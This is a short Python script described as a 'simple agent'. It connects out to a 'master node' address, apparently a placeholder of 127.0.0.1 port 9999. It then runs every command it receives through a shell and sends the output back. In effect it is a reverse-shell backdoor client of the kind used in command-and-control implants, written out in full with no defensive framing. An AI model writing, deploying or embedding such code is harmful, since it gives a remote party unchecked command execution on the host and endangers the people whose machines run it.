import socket
import threading
import os
import subprocess

# Simple Agent Implementation
def agent(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    while True:
        try:
            # Receive command from the master node
            data = client.recv(1024)
            if data:
                command = data.decode()
                
                # Handle exit command
                if command.lower() == "exit":
                    client.close()
                    break
                
                # Execute the received command
                if os.name == 'nt':
                    output = subprocess.getoutput(command)
                else:
                    output = subprocess.getoutput(command)
                
                # Send the command output back to the master node
                if output:
                    client.send(output.encode())
                else:
                    client.send("Command executed with no output".encode())
        except Exception as e:
            client.send(f"Error: {str(e)}".encode())
            client.close()
            break

# Run agent
if __name__ == "__main__":
    HOST = "127.0.0.1"  # Master node IP
    PORT = 9999          # Master node Port
    agent_thread = threading.Thread(target=agent, args=(HOST, PORT))
    agent_thread.start()
